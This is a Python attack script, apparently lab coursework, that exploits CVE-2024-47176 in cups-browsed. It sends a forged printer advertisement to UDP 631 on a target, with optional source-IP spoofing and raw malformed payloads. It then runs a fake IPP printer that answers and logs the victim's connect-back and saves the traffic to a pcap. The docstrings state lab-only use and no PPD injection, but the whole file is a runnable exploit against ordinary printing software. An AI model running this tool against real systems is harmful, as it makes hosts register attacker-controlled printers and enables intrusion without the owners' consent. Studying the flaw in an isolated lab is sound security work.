#!/usr/bin/env python3
"""cups_attack.py - advertise a fake printer to cups-browsed (CVE-2024-47176) with Scapy.

Sends a CUPS browse packet to UDP 631 on the victim, then watches whether the victim
connects back to the advertised printer. Lab use only (isolated Docker network).

Example:
  sudo python3 cups_attack.py -t 172.20.0.10 -p 172.20.0.1 --pcap pcap_files/03_attack.pcap
"""
import argparse
import codecs
import logging
import socket
import struct
import threading
import time

from scapy.all import IP, UDP, TCP, Raw, AsyncSniffer, send, wrpcap

IPP_OPS = {0x02: "Print-Job", 0x04: "Validate-Job", 0x05: "Create-Job",
           0x06: "Send-Document", 0x0A: "Get-Jobs", 0x0B: "Get-Printer-Attributes"}

log = logging.getLogger("cups_attack")


def build_payload(a):
    """Browse packet: <type> <state> <uri> "<location>" "<info>" (all fields are attacker chosen)."""
    if a.raw:  # send exactly what the user typed, for malformed-packet tests
        return codecs.decode(a.raw, "unicode_escape").encode()
    uri = f"{a.scheme}://{a.printer_ip}:{a.printer_port}/printers/{a.name}"
    return f'{a.type} {a.state} {uri} "{a.location}" "{a.info}"\n'.encode()


def ipp_attr(tag, name, value):
    value = value if isinstance(value, bytes) else value.encode()
    return struct.pack(">BH", tag, len(name)) + name.encode() + struct.pack(">H", len(value)) + value


def ipp_response(request_id, a):
    """Minimal successful Get-Printer-Attributes answer. Harmless values only, no PPD injection."""
    body = struct.pack(">BBHI", 2, 0, 0, request_id) + b"\x01"           # IPP 2.0, successful-ok
    body += ipp_attr(0x47, "attributes-charset", "utf-8")
    body += ipp_attr(0x48, "attributes-natural-language", "en")
    body += b"\x04"                                                       # printer attributes
    uri = f"ipp://{a.printer_ip}:{a.printer_port}/printers/{a.name}"
    for tag, name, value in [
        (0x45, "printer-uri-supported", uri),
        (0x42, "printer-name", a.name),
        (0x41, "printer-info", a.info),
        (0x41, "printer-make-and-model", "DAT505 Rogue Printer (attacker controlled)"),
        (0x23, "printer-state", struct.pack(">I", 3)),
        (0x22, "printer-is-accepting-jobs", b"\x01"),
        (0x49, "document-format-supported", "application/pdf"),
        (0x44, "media-supported", "iso_a4_210x297mm"),
        (0x44, "media-default", "iso_a4_210x297mm"),
        (0x22, "color-supported", b"\x00"),
    ]:
        body += ipp_attr(tag, name, value)
    body += b"\x03"                                                       # end of attributes
    head = (f"HTTP/1.1 200 OK\r\nContent-Type: application/ipp\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    return head + body


def handle_client(conn, addr, a):
    """Log which IPP operation the victim asks the fake printer for, and answer it."""
    with conn:
        conn.settimeout(5)
        data = b""
        try:
            while b"\r\n\r\n" not in data:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            head, _, body = data.partition(b"\r\n\r\n")
            if b"chunked" in head.lower():  # skip the chunk-size line
                body = body.partition(b"\r\n")[2]
            if len(body) < 8:
                body += conn.recv(4096)
            request_line = head.split(b"\r\n")[0].decode(errors="replace")
            _, op, req_id = struct.unpack(">HHI", body[:8])
            log.warning("CALLBACK: victim %s:%d -> fake printer | %s | IPP op 0x%04x %s",
                        addr[0], addr[1], request_line, op, IPP_OPS.get(op, "unknown"))
            conn.sendall(ipp_response(req_id, a))
        except (OSError, struct.error) as e:
            log.warning("CALLBACK: victim %s:%d connected, could not parse request (%s)", *addr, e)


def listener(a, stop):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", a.printer_port))
    srv.listen()
    srv.settimeout(1)
    log.info("fake IPP printer listening on tcp/%d", a.printer_port)
    while not stop.is_set():
        try:
            conn, addr = srv.accept()
        except socket.timeout:
            continue
        threading.Thread(target=handle_client, args=(conn, addr, a), daemon=True).start()
    srv.close()


def main():
    p = argparse.ArgumentParser(description="Advertise an attacker-controlled printer to cups-browsed.")
    p.add_argument("-t", "--target", required=True, help="victim IP (cups-browsed)")
    p.add_argument("--target-port", type=int, default=631, help="victim UDP port (default 631)")
    p.add_argument("-p", "--printer-ip", required=True, help="printer address put in the advertisement")
    p.add_argument("-P", "--printer-port", type=int, default=8631, help="printer port in the advertisement")
    p.add_argument("--scheme", default="ipp", help="URI scheme: ipp, ipps, http (default ipp)")
    p.add_argument("-n", "--name", default="RoguePrinter", help="queue name after /printers/")
    p.add_argument("--type", default="0", help="printer-type field, hex (default 0)")
    p.add_argument("--state", default="3", help="printer-state field: 3 idle, 4 busy, 5 stopped")
    p.add_argument("--location", default="Lab", help="location field")
    p.add_argument("--info", default="Rogue Printer", help="info field (victim uses it for the queue name)")
    p.add_argument("--raw", help="send this payload instead of building one (\\n escapes allowed)")
    p.add_argument("--src", help="spoof the source IP of the UDP packet")
    p.add_argument("-c", "--count", type=int, default=1, help="number of packets to send")
    p.add_argument("-i", "--interval", type=float, default=1.0, help="seconds between packets")
    p.add_argument("-w", "--wait", type=int, default=20, help="seconds to watch for a callback")
    p.add_argument("--iface", default="br-cups", help="interface to sniff on (default br-cups)")
    p.add_argument("--no-listen", action="store_true", help="do not run the fake IPP printer")
    p.add_argument("--pcap", help="write captured traffic to this pcap file")
    p.add_argument("--log", default="cups_attack.log", help="log file (default cups_attack.log)")
    a = p.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s",
                        handlers=[logging.StreamHandler(), logging.FileHandler(a.log)])

    stop = threading.Event()
    if not a.no_listen:
        threading.Thread(target=listener, args=(a, stop), daemon=True).start()
    sniffer = AsyncSniffer(iface=a.iface, filter=f"host {a.target}")
    sniffer.start()
    time.sleep(1)

    payload = build_payload(a)
    pkt = IP(dst=a.target) / UDP(sport=40000, dport=a.target_port) / Raw(payload)
    if a.src:
        pkt[IP].src = a.src
    log.info("sending %d packet(s) to %s:%d payload=%r", a.count, a.target, a.target_port, payload)
    send(pkt, count=a.count, inter=a.interval, verbose=False)

    log.info("watching %d s for the victim to connect back ...", a.wait)
    time.sleep(a.wait)
    stop.set()
    packets = sniffer.stop()

    # A TCP SYN from the victim = the victim started a connection on its own.
    syns = {(pk[IP].dst, pk[TCP].dport) for pk in packets
            if pk.haslayer(TCP) and pk[IP].src == a.target and pk[TCP].flags == "S"}
    for dst, dport in sorted(syns):
        log.warning("RESULT: victim %s opened TCP connection to %s:%d", a.target, dst, dport)
    if not syns:
        log.info("RESULT: no TCP connection from the victim seen")

    if a.pcap:
        wrpcap(a.pcap, packets)
        log.info("saved %d packets to %s", len(packets), a.pcap)


if __name__ == "__main__":
    main()
